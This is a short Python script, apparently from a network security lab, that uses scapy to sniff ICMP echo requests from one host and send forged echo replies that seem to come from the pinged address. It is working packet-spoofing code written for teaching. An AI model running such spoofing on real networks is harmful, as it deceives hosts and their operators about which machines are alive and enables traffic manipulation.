#!usr/bin/python3
from scapy.all import *

def spoof_pkt(pkt):
    # if the ICMP is from type ping
    if ICMP in pkt and pkt[ICMP].type == 8:
       
        print("Before spoofing , Source IP - ", pkt[IP].src)
        #create a new IP
        #put the destination of the original packet as the new ip's source
        # put the source of the original packet as the new ip packet destination
        ip = IP(src=pkt[IP].dst , dst=pkt[IP].src, ihl=pkt[IP].ihl)
        
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)


        data = pkt[Raw].load
        # overloading the new IP ontop of the layers of ICMP (the type ping belongs to)
        # and over a raw packet
        newpkt = ip/icmp/data
        print("")
        print("Spoofed packet:")
        print("Source IP - ",newpkt[IP].src)
        print("Destination IP - ", newpkt[IP].dst)
        #sending the new packet as a ping response
        send(newpkt, verbose=0)
        print("")

def print_pkt(pkt):
    pkt.show()


pkt = sniff(filter='icmp and src host 10.0.2.15', prn=spoof_pkt)
